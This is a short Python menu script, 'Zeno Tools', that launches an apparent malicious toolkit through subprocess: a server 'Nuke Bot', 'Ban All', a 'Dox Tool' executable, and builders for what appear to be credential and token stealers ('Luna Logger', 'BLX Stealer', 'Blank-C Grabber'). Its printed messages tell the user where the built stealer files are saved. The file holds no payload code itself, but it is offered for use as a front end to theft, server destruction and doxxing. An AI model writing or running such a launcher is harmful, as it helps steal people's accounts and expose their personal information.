import subprocess
import sys
import string
import os
from time import sleep
print('''
  ______                          
 |___  /                          
    / /  ___  _ __    ___   _ __  
   / /  / _ \| '_ \  / _ \ | '_ \ 
  / /__|  __/| | | || (_) || | | |
 /_____|\___||_| |_| \___/ |_| |_|
                                  
                                  ''')

print("Zeno Tools made by Zenon Logger")
print("Pick your option")

options = ["[1] Nuke Bot",
           "[2] Luna Logger",
           "[3] Ban All",
           "[4] BLX Stealer",
           "[5] Blank-C Grabber",
           "[6] Dox Tool"]


# Print the options in a 3x4 column
for i, option in enumerate(options, start=1):
    print(option)

choice = input("Enter the number of your choice: ")

if choice == "1":
    sleep(1)
    # Run the nuke.py script from the modules folder (lowercase)
    subprocess.run(["python", "modules/nuke/dist/nuke.py"])
elif choice == "2":
    sleep(1)
    print("To find your logger file go to modules then logger and you'll find it")
    # Run the logger.py script from the modules folder (lowercase)
    subprocess.run(["python", "modules/logger/builder.pyw"])
elif choice == "3":
    sleep(1)
    # Run the BanAll.py script from the modules folder (lowercase)
    subprocess.run(["python", "modules/banall/dist/BanAll.py"])
elif choice == "4":
    print("To find your blx logger file go to modules then blx and you'll find it in dist folder")
    sleep(1)
    # Run the BLXgrabber.py script from the modules folder (lowercase)
    subprocess.run(["python", "modules/blx/builder.py"])
elif choice == "5":
    print("To find your blank logger file go to modules then blank and you'll find it in either the dist folder or in the folder")
    sleep(1)
    # Run the BlankGrabber.py script from the modules folder (lowercase)
    subprocess.run(["python", "modules/blank/gui.py"])
elif choice == "6":
    sleep(1)
    subprocess.run(["modules/doxtool/Dox_Tool_V2.exe"])
else:
    print("Invalid option. Please choose a valid option.")

